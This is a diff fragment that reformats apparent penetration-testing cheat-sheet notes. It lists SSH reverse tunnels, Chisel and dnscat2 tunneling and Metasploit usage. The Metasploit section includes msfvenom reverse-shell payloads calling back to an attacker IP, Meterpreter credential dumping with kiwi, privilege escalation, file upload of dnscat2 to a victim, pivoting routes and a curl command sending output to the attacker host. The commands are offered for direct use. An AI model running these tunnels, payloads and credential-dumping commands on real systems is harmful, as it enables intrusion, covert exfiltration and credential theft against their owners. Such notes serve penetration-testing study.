+  		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+		
+  		2. `ssh -N -R <listening-addr>:<listening-port>:<destination-addr>:<destination-port> kali@<attacker-IP>`
+		
+  		3. `ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.45.204`
+		
+   			1. `127.0.0.1:2345` is the bind port on the SSH server you control (kali)
+			
+   			2. `10.4.50.215:5432` is the destination socket routable from the compromised client
+		
+  		4. `ss -ntlpu | grep 2345`                 (verify the local port is now bound)
+	
+ 	5. SSH remote dynamic port forward:
+	
+  		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+		
+  		2. `ssh -R <local-bind-port> user@192.168.45.204`
+		
+   			1. `ssh -R 9999 kali@192.168.45.204`
+			
+   			2. (any host routable from the compromised SSH client will be reachable via `proxychains ... 127.0.0.1:9999`)
+
 4. tunneling/forwarding via SSHuttle:
-	1. `sshuttle -r user@10.0.0.174:2222 10.4.5.0/24 172.16.50.0/24`
-	2. `sshuttle -H -r kali@192.168.45.204:4444 0/0`
+
+ 	1. `sshuttle -r user@10.0.0.174:2222 10.4.5.0/24 172.16.50.0/24`
+	
+ 	2. `sshuttle -H -r kali@192.168.45.204:4444 0/0`
 
 
 **Tunneling Through Deep Packet Inspection:**
+
 1. [Chisel](https://github.com/jpillora/chisel/releases):
-	2. `chisel server --port 8085 --reverse`
-	3. `chisel client 192.168.45.204:8085 R:socks > /dev/null 2>&1 &`
-		1. troubleshooting chisel connectivity:
-			1. `sudo tcpdump -nvvXi tun0 tcp port 8081`
-			2. `chisel client 192.168.45.204:8085 R:socks &> output.txt; curl --data @output.txt http://192.168.45.204:8081/`
-	4.  `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h%p' kali@192.168.45.204`             (tunneling through the socks proxy at 1080)
+
+ 	2. `chisel server --port 8085 --reverse`
+	
+ 	3. `chisel client 192.168.45.204:8085 R:socks > /dev/null 2>&1 &`
+	
+  		1. troubleshooting chisel connectivity:
+		
+   			1. `sudo tcpdump -nvvXi tun0 tcp port 8081`
+			
+   			2. `chisel client 192.168.45.204:8085 R:socks &> output.txt; curl --data @output.txt http://192.168.45.204:8081/`
+	
+ 	4.  `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h%p' kali@192.168.45.204`             (tunneling through the socks proxy at 1080)
+
 2. Manual DNS Tunneling:
-	1. `dnsmasq.conf`:
+
+ 	1. `dnsmasq.conf`:
 ```
 no-resolv
 no-hosts
@@ -822,11 +1079,16 @@ txt-record=www.feline.corp,here's something else too.
 		1. (resolve A record)
 	6. nslookup -type=txt www.controlled-domain.com
 		1. (grab TXT records directly from controlled authoritative server; this can infiltrate data into the network)
+
 3. [dnscat2](https://github.com/iagox86/dnscat2):
-	1. `sudo tcpdump -i tun0 udp port 53`            (monitor DNS traffic on name server)
-	2. `dnscat2-server controlled-domain.com` 
-	3. `./dnscat controlled-domain.com`       (dnscat-client takes the domain as param 1)
-	4. `dnscat2>`
+
+ 	1. `sudo tcpdump -i tun0 udp port 53`            (monitor DNS traffic on name server)
+	
+ 	2. `dnscat2-server controlled-domain.com` 
+	
+ 	3. `./dnscat controlled-domain.com`       (dnscat-client takes the domain as param 1)
+	
+ 	4. `dnscat2>`
 ```
 windows
 windows -i 3
@@ -841,9 +1103,8 @@ listen 192.168.244.7:9998 172.16.244.217:445
 2. `sudo systemctl enable postgresql`
 3. `sudo msfconsole`
 
+**General Commands:** 
 ```
-General Commands: 
-
 db_status
 workspace
 workspace -a new_workspace
@@ -853,9 +1114,8 @@ services
 services -p 21
 ```
 
+**Auxiliary modules:**
 ```
-Auxiliary modules:
-
 show auxiliary
 search scanner/X
 search type:auxiliary smb
@@ -871,16 +1131,14 @@ creds
 jobs
 ```
 
+**Exploit modules:**
 ```
-Exploit modules:
-
 Ctrl-Z                 (put a session in the background)
 sessions -k 12         (kill session 12)
 ```
 
+**Meterpreter payloads:**
 ```
-Meterpreter payloads:
-
 channel -l
 channel -i 2
 sysinfo
@@ -893,17 +1151,15 @@ download C:\\Users\\Alex\\Desktop\\proof.txt
 upload dnscat2.exe C:\\Users\\Alex\\Desktop\\runme.exe
 ```
 
+**msfvenom:**
 ```
-msfvenom:
-
 msfvenom -l payloads --platform linux --arch x64
 msfvenom -l windows/x64/shell_reverse_tcp LHOST=192.168.45.204 LPORT=4444 -f exe -o binary.exe
 msfvenom -p php/reverse_php LHOST=192.168.45.204 LPORT=443 -o form.pHP -f raw
 ```
 
+**Post-Exploitation:**
 ```
-Post-Exploitation:
-
 idletime
 getsystem
 getuid
@@ -918,9 +1174,9 @@ load kiwi
 	- creds_all
 ```
 
+**Pivoting with Metasploit/Meterpreter:**
 ```
-Pivoting with Metasploit/Meterpreter:
-	- either manually declare routes or have autoroute establish them automatically; turn a session into a pivot point using the portfwd command; turn the current Metasploit instance into a SOCKS proxy (127.0.0.1:1080) using multi/manage/autoroute
+**either manually declare routes or have autoroute establish them automatically; turn a session into a pivot point using the portfwd command; turn the current Metasploit instance into a SOCKS proxy (127.0.0.1:1080) using multi/manage/autoroute
 
 route add 172.16.50.0/24 3
 	- params: foreign subnet, session-ID
@@ -941,9 +1197,8 @@ portfwd add -l 9998 -p 445 -r 172.16.50.4
 	- run -j
 ```
 
+**Miscellaneous:**
 ```
-Miscellaneous:
-
 multi/script/web_delivery           (generate one-liners and run their servers)
 
 impersonating tokens with Metasploit:
@@ -998,7 +1253,7 @@ unsetg
 ```
 
 
-**Active Directory Information and Enumeration:**
+****Active Directory Information and Enumeration:****
 
 ```
 xfreerdp /u:Administrator /d:domain.local /v:10.0.0.174 /p:Password1#
